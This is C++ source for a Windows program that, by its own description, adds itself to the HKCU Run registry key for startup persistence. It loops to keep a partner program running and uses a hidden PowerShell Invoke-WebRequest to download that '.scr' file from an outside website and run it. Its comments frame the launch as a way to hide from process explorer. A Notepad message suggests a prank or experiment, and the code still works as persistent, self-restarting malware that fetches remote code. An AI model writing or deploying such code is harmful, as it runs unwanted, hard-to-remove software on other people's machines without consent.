#include <windows.h>
#include <tchar.h>
#include <cstdio>
#include <string>
#include <fstream>
#include <psapi.h>
/*
Adds itself to the windows registry to run on startup
Starts its friend program
*/
bool IsProcessRunning(const std::wstring& processName);
int downloadProgram(LPCWSTR websitePath, LPCWSTR filePathOnWebsite, std::string storagePath);
bool FileExists(const std::wstring& filePath);
void openNotepad();

int _tmain(int argc, _TCHAR* argv[]) {
    // adds itself to registry
    HKEY hKey;
    const TCHAR* subkey = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        _tprintf(_T("Could not open registry key.\n"));
        return 1;
    }

    const TCHAR* valueName = _T("Watcher_2");

    // gets the current path of the program
    TCHAR pathToExe[MAX_PATH];
    if (!GetModuleFileName(NULL, pathToExe, MAX_PATH))
    {
        return 1;
    }

    if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (LPBYTE)pathToExe, (_tcslen(pathToExe) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
        _tprintf(_T("Could not set registry value.\n"));
        RegCloseKey(hKey);
        return 1;
    }

    RegCloseKey(hKey);

    // continually checks if the second program exists. If it does not exist, starts it. if it can't start it, downloads it.
    while (true) {
        if (IsProcessRunning(L"watcher_1.scr")) {    
            openNotepad();
        } else {
            // Powershell starts the program. It dies immediately afterwards
            // This obfuscates it from a cursory glance in process explorer
            // Known as "Process Injection"
            std::string pathToProgram = "C:\\Windows\\Temp\\watcher_1.scr";
            std::wstring pathToProgramW = L"C:\\Windows\\Temp\\watcher_1.scr";
            // Check if the file exists
            if (!FileExists(pathToProgramW)) {
                // If the file doesn't exist, download it
                downloadProgram(L"www.andrewbernal.com/", L"watcher_1.scr", pathToProgram);
            }

            STARTUPINFOW si;
            PROCESS_INFORMATION pi;

            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));

            std::wstring cmdCommand = L"cmd.exe /C start \"\" \"" + pathToProgramW + L"\"";

            // Start the child process. 
            if (!CreateProcessW(NULL,   // No module name (use command line)
                (LPWSTR)cmdCommand.c_str(), // Command line
                NULL,           // Process handle not inheritable
                NULL,           // Thread handle not inheritable
                FALSE,          // Set handle inheritance to FALSE
                0,              // No creation flags
                NULL,           // Use parent's environment block
                NULL,           // Use parent's starting directory 
                &si,            // Pointer to STARTUPINFO structure
                &pi)           // Pointer to PROCESS_INFORMATION structure
            )
            {
                printf("CreateProcess failed (%d).\n", GetLastError());
                return 1;
            }
        }
        Sleep(3000); // Sleep for 3 seconds
    }  
  return 0;
}

int downloadProgram(LPCWSTR websitePath, LPCWSTR filePathOnWebsite, std::string storagePath) {
    std::wstring command = L"powershell Invoke-WebRequest -Uri ";
    command += websitePath;
    command += filePathOnWebsite;
    command += L" -OutFile ";
    command += std::wstring(storagePath.begin(), storagePath.end());
    
    PROCESS_INFORMATION pi;
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        return 1; // Error
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return 0;
}

bool IsProcessRunning(const std::wstring& processName) {
    DWORD aProcesses[1024], cbNeeded;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        return false;
    }
    DWORD cProcesses = cbNeeded / sizeof(DWORD);
    for (DWORD i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            HANDLE hProcess = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                FALSE,
                aProcesses[i]
            );
            if (hProcess != NULL) {
                HMODULE hMod;
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    wchar_t szProcessName[MAX_PATH];
                    GetModuleBaseNameW(
                        hProcess,
                        hMod,
                        szProcessName,
                        sizeof(szProcessName) / sizeof(wchar_t)
                    );
                    if (processName == szProcessName) {
                        CloseHandle(hProcess);
                        return true;
                    }
                }
            }
            CloseHandle(hProcess);
        }
    }
    return false;
}

void openNotepad() {
   if (!IsProcessRunning(L"notepad.exe")) {
        std::wstring filename = L"temp.txt";
        
        // Convert wstring to string for ofstream
        std::string filenameStr(filename.begin(), filename.end());
        
        std::ofstream file(filenameStr);
        if (file.is_open()) {
            file << "Hello! You can delete this program using Process Explorer.\nAlso make sure to delete watcher_1 and watcher_2 from the registry.\nThey can be found at: Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            file.close();
        }
        
        ShellExecuteW(NULL, L"open", L"notepad.exe", filename.c_str(), NULL, SW_SHOW);
    }
}

bool FileExists(const std::wstring& filePath) {
    DWORD dwAttrib = GetFileAttributesW(filePath.c_str());

    return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
           !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}


